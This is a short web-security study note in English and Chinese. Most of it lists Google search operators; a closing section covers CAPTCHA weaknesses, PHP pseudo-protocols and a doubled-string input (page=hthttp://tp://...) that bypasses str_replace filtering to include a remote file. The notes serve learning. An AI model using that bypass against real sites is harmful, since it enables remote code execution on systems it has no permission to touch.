# web_security

##  ------the skill of how to google------

###  accurate search
---
`“CESIGN”`

### excludeing a word
---
`linux -ubuntu`

### site search
---
`site:cesign.com hello`

### related words
---
`~hello`


### the wildcard
---
`"hello *"`

### time ranges
---
`ubuntu 2008..2010`

### file type
---
`filetype:pdf how to learn`

### one world or the other
---
`ubuntu or linux`

### word definitions
---
`define:word`

### find the words you want in one webpage
---
`intext:word1 word2 word3`

### find the words you want in the title of one page (<title>hello</title>:like this)
---
`intitle:word`

### find the cache data on the web
---
`cache:hdu.edu.cn`

### find the basic information of somwthing
---
`info:keyword`

### search the url contains the key word
---
`inurl:keyword`

### get all the url of one website
---
`site:url`

### find the page that has some connections with the url you give
---
`related:url`

### ? the way to use
---
`like a letter you don't know  eg:"I l?ve"`


##  实战篇
---
`加密方法 base64,rot13`
<hr/>
`工具 chrome插件：http-header修改：modify headers`
<hr/>
`验证码常有三种错误：（1）一个验证码可重复用，不过期；（2）验证码只能用一次，但后台清空后可以构造为空；`

---
### PHP伪协议
[学习地址](http://www.lorexxar.cn/2016/09/14/php-wei/)

### 常识
使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。
例如page=hthttp://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。
